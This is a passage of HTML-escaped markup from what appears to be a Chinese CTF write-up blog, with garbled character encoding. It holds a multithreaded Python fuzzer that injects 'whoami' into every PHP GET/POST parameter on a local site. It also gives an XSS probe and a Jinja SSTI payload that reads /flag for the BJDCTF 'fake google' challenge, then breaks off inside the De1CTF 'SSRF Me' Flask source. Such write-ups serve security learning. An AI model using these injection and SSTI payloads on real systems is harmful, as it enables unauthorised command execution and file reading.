class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; os&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; re&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; threading&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; time&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;å¼€å§‹æ—¶é—´ï¼š  &amp;#x27;&lt;/span&gt;+  time.asctime( time.localtime(time.time()) ))&lt;br&gt;s1=threading.Semaphore(&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;)  							  			&lt;span class=&#34;hljs-comment&#34;&gt;#è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°&lt;/span&gt;&lt;br&gt;filePath = &lt;span class=&#34;hljs-string&#34;&gt;r&amp;quot;D:/phpstudy_pro/WWW/src&amp;quot;&lt;/span&gt;&lt;br&gt;os.chdir(filePath)													&lt;span class=&#34;hljs-comment&#34;&gt;#æ”¹å˜å½“å‰çš„è·¯å¾„&lt;/span&gt;&lt;br&gt;requests.adapters.DEFAULT_RETRIES = &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;								&lt;span class=&#34;hljs-comment&#34;&gt;#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥&lt;/span&gt;&lt;br&gt;files = os.listdir(filePath)&lt;br&gt;session = requests.Session()&lt;br&gt;session.keep_alive = &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;											 &lt;span class=&#34;hljs-comment&#34;&gt;# è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get_content&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;file&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    s1.acquire()												&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;trying   &amp;#x27;&lt;/span&gt;+file+ &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;     &amp;#x27;&lt;/span&gt;+ time.asctime( time.localtime(time.time()) ))&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;open&lt;/span&gt;(file,encoding=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; f:							&lt;span class=&#34;hljs-comment&#34;&gt;#æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°&lt;/span&gt;&lt;br&gt;            gets = &lt;span class=&#34;hljs-built_in&#34;&gt;list&lt;/span&gt;(re.findall(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\$_GET\[\&amp;#x27;(.*?)\&amp;#x27;\]&amp;#x27;&lt;/span&gt;, f.read()))&lt;br&gt;            posts = &lt;span class=&#34;hljs-built_in&#34;&gt;list&lt;/span&gt;(re.findall(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\$_POST\[\&amp;#x27;(.*?)\&amp;#x27;\]&amp;#x27;&lt;/span&gt;, f.read()))&lt;br&gt;    data = &amp;#123;&amp;#125;														&lt;span class=&#34;hljs-comment&#34;&gt;#æ‰€æœ‰çš„$_POST&lt;/span&gt;&lt;br&gt;    params = &amp;#123;&amp;#125;														&lt;span class=&#34;hljs-comment&#34;&gt;#æ‰€æœ‰çš„$_GET&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; m &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; gets:&lt;br&gt;        params[m] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; n &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; posts:&lt;br&gt;        data[n] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;&lt;br&gt;    url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;http://127.0.0.1/src/&amp;#x27;&lt;/span&gt;+file&lt;br&gt;    req = session.post(url, data=data, params=params)			&lt;span class=&#34;hljs-comment&#34;&gt;#ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST&lt;/span&gt;&lt;br&gt;    req.close()												&lt;span class=&#34;hljs-comment&#34;&gt;# å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜&lt;/span&gt;&lt;br&gt;    req.encoding = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;&lt;br&gt;    content = req.text&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;#print(content)&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;32720&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; content:									&lt;span class=&#34;hljs-comment&#34;&gt;#å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°&lt;/span&gt;&lt;br&gt;        flag = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; a &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; gets:&lt;br&gt;            req = session.get(url+&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;?%s=&amp;#x27;&lt;/span&gt;%a+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;)&lt;br&gt;            content = req.text&lt;br&gt;            req.close()												&lt;span class=&#34;hljs-comment&#34;&gt;# å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜&lt;/span&gt;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;32720&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; content:&lt;br&gt;                flag = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; flag != &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; b &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; posts:&lt;br&gt;                req = session.post(url, data=&amp;#123;b:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;&amp;#125;)&lt;br&gt;                content = req.text&lt;br&gt;                req.close()												&lt;span class=&#34;hljs-comment&#34;&gt;# å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜&lt;/span&gt;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;32720&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; content:&lt;br&gt;                    &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; flag == &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:													&lt;span class=&#34;hljs-comment&#34;&gt;#flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ&lt;/span&gt;&lt;br&gt;            param = a&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;            param = b&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &amp;#x27;&lt;/span&gt;+file+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&amp;quot;&lt;/span&gt; %param)&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ç»“æŸæ—¶é—´ï¼š  &amp;#x27;&lt;/span&gt; + time.asctime(time.localtime(time.time())))&lt;br&gt;    s1.release()&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; files:															&lt;span class=&#34;hljs-comment&#34;&gt;#åŠ å…¥å¤šçº¿ç¨‹&lt;/span&gt;&lt;br&gt;   t = threading.Thread(target=get_content, args=(i,))&lt;br&gt;   t.start()&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;æœç„¶è¿˜æ˜¯èœçš„æƒ¨ä¸å¿ç¹&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;BJDCTF-2nd-fake-google&#34;&gt;&lt;a href=&#34;#BJDCTF-2nd-fake-google&#34; class=&#34;headerlink&#34; title=&#34;[BJDCTF 2nd]fake google&#34;&gt;&lt;/a&gt;[BJDCTF 2nd]fake google&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;æµ‹è¯•&lt;code&gt;&amp;lt;script&amp;gt;alert(111)&amp;lt;/script&amp;gt;&lt;/code&gt;å¯ä»¥æ‰§è¡Œ&lt;/li&gt;
&lt;li&gt;æŸ¥çœ‹ç½‘é¡µæºä»£ç æç¤ºssti&lt;/li&gt;
&lt;li&gt;?name=3æµ‹è¯•çš„ç¡®å­˜åœ¨ssti&lt;/li&gt;
&lt;li&gt;æœ€ç»ˆpayloadï¼š&lt;code&gt;?name=&amp;#123;&amp;#123;True.__class__.__mro__[1].__subclasses__()[177].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/flag&#39;).read()&amp;#125;&amp;#125;&lt;/code&gt;ç›´æ¥æ‹¿åˆ°flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;De1CTF-2019-SSRF-Me&#34;&gt;&lt;a href=&#34;#De1CTF-2019-SSRF-Me&#34; class=&#34;headerlink&#34; title=&#34;[De1CTF 2019]SSRF Me&#34;&gt;&lt;/a&gt;[De1CTF 2019]SSRF Me&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;è®¿é—®æ‹¿åˆ°æºç ï¼Œæºç å®¡è®¡&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#! /usr/bin/env python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#encoding=utf-8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; Flask&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; request&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; socket&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; hashlib&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; urllib&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; sys&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; os&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; json&lt;br&gt;reload(sys)&lt;br&gt;sys.setdefaultencoding(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;latin1&amp;#x27;&lt;/span&gt;)&lt;br&gt;&lt;br&gt;app = Flask(__name__)&lt;br&gt;&lt;br&gt;secert_key = os.urandom(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Task&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self, action, param, sign, ip&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;        self.action = action&lt;br&gt;        self.param = param&lt;br&gt;        self.sign = sign&lt;br&gt;        self.sandbox = md5(ip)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;not&lt;/span&gt; os.path.exists(self.sandbox)):          &lt;span class=&#34;hljs-comment&#34;&gt;#SandBox For Remote_Addr&lt;/span&gt;&lt;br&gt;            os.mkdir(self.sandbox)&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Exec&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;        result = &amp;#123;&amp;#125;&lt;br&gt;        result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;500&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (self.checkSign()):&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;scan&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; self.action:&lt;br&gt;                tmpfile = &lt;span class=&#34;hljs-built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;./%s/result.txt&amp;quot;&lt;/span&gt; % self.sandbox, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;w&amp;#x27;&lt;/span&gt;)&lt;br&gt;                resp = scan(self.param)&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (resp == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Connection Timeout&amp;quot;&lt;/span&gt;):&lt;br&gt;                    result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;data&amp;#x27;&lt;/span&gt;] = resp&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;                    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt; resp&lt;br&gt;                    tmpfile.write(resp)&lt;br&gt;                    tmpfile.close()&lt;br&gt;                result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;read&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; self.action:&lt;br&gt;                f = &lt;span class=&#34;hljs-built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;./%s/result.txt&amp;quot;&lt;/span&gt; % self.sandbox, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;)&lt;br&gt;                result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;&lt;br&gt;                result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;data&amp;#x27;&lt;/span&gt;] = f.read()&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] == &lt;span class=&#34;hljs-number&#34;&gt;500&lt;/span&gt;:&lt;br&gt;                result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;data&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Action Error&amp;quot;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;            result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;500&lt;/span&gt;&lt;br&gt;            result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;msg&amp;#x27;&lt;/span&gt;] = &lt;span 